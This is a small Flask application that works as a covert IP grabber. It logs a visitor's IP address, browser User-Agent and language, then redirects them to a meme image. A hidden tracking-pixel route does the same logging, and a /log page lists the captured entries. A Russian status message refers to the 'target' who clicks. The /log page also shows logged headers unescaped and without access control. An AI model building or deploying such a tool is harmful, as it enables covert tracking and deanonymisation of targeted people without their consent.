from flask import Flask, request, redirect
import datetime
import base64

app = Flask(__name__)

REDIRECT_URL = "https://i.imgur.com/your-meme.jpg"

LOG_FILE = "visitors.log"

@app.route('/')
def grab():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', 'Unknown')
    lang = request.headers.get('Accept-Language', 'Unknown')
    ts = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")

    with open(LOG_FILE, 'a') as f:
        f.write(f"[{ts}] IP: {ip} | UA: {ua} | Lang: {lang}\n")
        
    return redirect(REDIRECT_URL)

@app.route('/log')
def view_log():
    try:
        with open(LOG_FILE, 'r') as f:
            return f"<pre>{f.read()}</pre>"
    except FileNotFoundError:
        return "Лог пуст — цель ещё не кликнула"

@app.route('/pixel.gif')
def pixel():
    gif = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    ua = request.headers.get('User-Agent', 'Unknown')
    ts = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    with open(LOG_FILE, 'a') as f:
        f.write(f"[{ts}] PIXEL IP: {ip} | UA: {ua}\n")
    return gif, 200, {'Content-Type': 'image/gif'}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
